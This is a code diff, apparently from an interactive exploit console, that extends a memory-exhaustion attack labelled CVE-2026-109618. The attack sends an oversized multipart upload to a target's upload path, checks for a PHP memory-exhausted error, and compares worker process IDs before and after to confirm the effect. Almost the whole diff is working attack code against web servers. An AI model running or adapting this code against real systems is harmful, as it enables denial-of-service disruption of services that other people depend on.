@@ -270,18 +270,43 @@ class Console:
             return
         print(f"\033[93m[CVE-2026-109618] OOM attack — {strategy}\033[0m")
         body = strategies[strategy]()
-        print(f"Sending {human_size(len(body))} multipart ({strategy}, {self.part_headers:,} headers)...")
+        upload_path = self.path("upload")
+        print(f"Step 1: Baseline GET {upload_path}...")
+        baseline = send(self.scheme, self.host, self.port, "GET",
+                        upload_path, self.timeout, None, "oom-baseline")
+        if "transport_error" in baseline:
+            print(f"  \033[91m{baseline['transport_error']}\033[0m")
+            return
+        baseline_pid = baseline.get("worker_pid_header")
+        print(f"  HTTP {baseline.get('http_status')}"
+              f"{f', PID {baseline_pid}' if baseline_pid else ''}")
+        print(f"Step 2: Sending {human_size(len(body))} multipart ({strategy}, {self.part_headers:,} headers)...")
         result = send(self.scheme, self.host, self.port, "POST",
-                      self.path("upload"), self.timeout, None, "oom-candidate",
+                      upload_path, self.timeout, None, "oom-candidate",
                       body, f"multipart/form-data; boundary={BOUNDARY}")
         if "transport_error" in result:
             print(f"  \033[91m{result['transport_error']}\033[0m")
             return
         body_text = result.get("body_prefix", "")
+        oom_observed = "Allowed memory size" in body_text and "exhausted" in body_text
         print(f"  HTTP {result.get('http_status')} ({result.get('elapsed_ms')}ms)")
-        if "Allowed memory size" in body_text and "exhausted" in body_text:
+        if oom_observed:
             print("  \033[93mOOM triggered!\033[0m")
         print(f"  Body: {body_text[:200]}")
+        print(f"Step 3: Verify — GET {upload_path}...")
+        after = send(self.scheme, self.host, self.port, "GET",
+                     upload_path, self.timeout, None, "oom-after")
+        if "transport_error" in after:
+            print(f"  \033[91mServer unreachable: {after['transport_error']}\033[0m")
+        else:
+            after_pid = after.get("worker_pid_header")
+            print(f"  HTTP {after.get('http_status')}"
+                  f"{f', PID {after_pid}' if after_pid else ''}")
+            if oom_observed and baseline_pid and after_pid:
+                if baseline_pid == after_pid:
+                    print(f"  \033[92mOOM confirmed — same worker {baseline_pid} survived (PHP fatal, not process crash)\033[0m")
+                else:
+                    print(f"  \033[92mOOM + worker replaced! PID {baseline_pid} → {after_pid}\033[0m")
 
     def cmd_109619(self):
         self.require_target()
